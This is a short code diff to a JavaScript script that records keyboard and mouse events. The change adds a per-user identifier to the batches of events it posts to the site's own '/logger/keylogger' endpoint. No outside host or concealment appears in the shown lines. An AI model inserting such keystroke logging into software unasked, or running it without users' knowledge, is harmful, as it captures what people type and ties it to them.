@@ -2,6 +2,8 @@
 var kl_events = [];
 var kl_debug = false;
 
+var kl_uuid = "";
+
 function kl_logKeyMouseEvent(evt) {
   let unixtime = Date.now()
 
@@ -42,7 +44,7 @@ function kl_flush() {
   if (kl_events.length>0) {
     eventsToSend = kl_events;
     kl_events = [];
-    var data = JSON.stringify(eventsToSend);
+    var data = JSON.stringify({ uuid: kl_uuid, events: eventsToSend });
 
     let url = `${window.location.origin}/logger/keylogger`;
     if (kl_debug) {
